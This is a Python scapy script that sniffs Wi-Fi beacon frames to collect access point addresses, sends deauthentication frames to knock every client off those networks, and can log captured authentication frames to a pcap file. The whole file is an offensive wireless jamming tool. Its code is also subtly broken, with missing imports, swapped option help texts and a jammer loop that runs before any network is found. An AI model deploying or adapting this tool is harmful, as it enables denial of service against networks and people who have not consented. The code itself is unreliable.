#!/bin/python3
from sys import argv
from os import path
import argparse
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.utils import PcapWriter
from scapy.sendrecv import sniff
import threading

global AP_list
AP_list = []

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()

parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Enable verbose logging', default=False)
parser.add_argument('interface', action='store', help='Sets the interface to use for sending and receiving')

group.add_argument('-l', '--ignore-list', dest='list', action='store', type=list, help='Ignore APs inside this file')
group.add_argument('-f', '--ignore-file', dest='file', action='store', type=str, help='Ignore APs given by command line input')

parser.add_argument('-o', '--output', dest='output', action='store', type=str, help='File to write captured Auth Frames to (will only jam if not set)')

args = parser.parse_args()

if args.verbose == True:
	def verbose_output(status, output, *details):
		if status == 1:
			statement = "\t[*] "
		elif status == 0:
			statement = "\t[ ] "
		elif status == 2:
			statement = "\t\t"
		statement += output
		if details:
			for x in details:
				statement += "\n\t\t\t" + x
		print(statement)
else:
	def verbose_output(status, output, *details):
		return None

if args.list:
	ignore_AP = args.list
elif args.file:
	with open(args.file, 'r') as file:
		ignore_AP = [file.readlines()]

if args.output:
	output = PcapWriter(args.output, append=True)


def Jammer():
	if len(AP_list) != 0:
		for AP in AP_list:
			verbose_output(1, f'De-Authenticating All Clients on AP {AP}')
			DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = AP, addr3 = AP)/Dot11Deauth(reason=2)
			sendp(DeAuth_Frame)

def PacketHandler(packet):
	print(packet.summary)
	if packet.haslayer(Dot11):
		if packet.addr2 not in ignore_AP:
			if packet.type == 0:
				verbose_output(1, f'Found Management Frame')
				if packet.subtype == 8:
					verbose_output(1, f'Found Beacon Frame')
					if packet.addr2 not in AP_list:
						AP_list.append(packet.addr2)
						verbose_output(1, f'Access Point Found: {packet.addr2}')
				elif packet.subtype == 11:
					if output:
						output.write(packet)
						verbose_output(1, f'Authentication Frame Found for AP {packet.addr2}')

verbose_output(0, f'Starting loop')

beaconSniffer = threading.Thread(target = sniff, kwargs = dict(prn=PacketHandler, iface=args.interface))
jammer = threading.Thread(target = Jammer)

beaconSniffer.start()
jammer.start()